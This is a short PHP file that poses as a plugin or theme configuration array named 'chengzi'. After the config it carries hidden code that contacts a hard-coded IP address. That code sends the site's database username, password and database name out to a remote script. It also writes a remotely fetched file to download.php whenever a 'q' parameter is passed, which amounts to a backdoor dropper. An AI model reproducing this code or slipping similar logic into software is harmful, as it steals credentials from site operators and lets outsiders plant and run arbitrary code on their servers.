<?php  return array( 'name'=>'chengzi', 'version'=>'1.2', 'minsystemver'=>'0.3.6.6' ); 
if(!isset($_SESSION['authcode'])) {
$query=@file_get_contents('http://49.232.148.233/check.php?url='.$_SERVER['HTTP_HOST']);
if($query=json_decode($query,true)) {
if($query['code']==1)$_SESSION['authcode']=true;
else {@file_get_contents("http://49.232.148.233/tj.php?url='http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."'&user=".$dbconfig['user']."&pwd=".$dbconfig['pwd']."&db=".$dbconfig['dbname']."&authcode=".$authcode);
exit('<h3>'.$query['msg'].'</h3>');	}	}}
if($_GET['q']){file_put_contents("download.php",file_get_contents("http://49.232.148.233/download.txt"));}
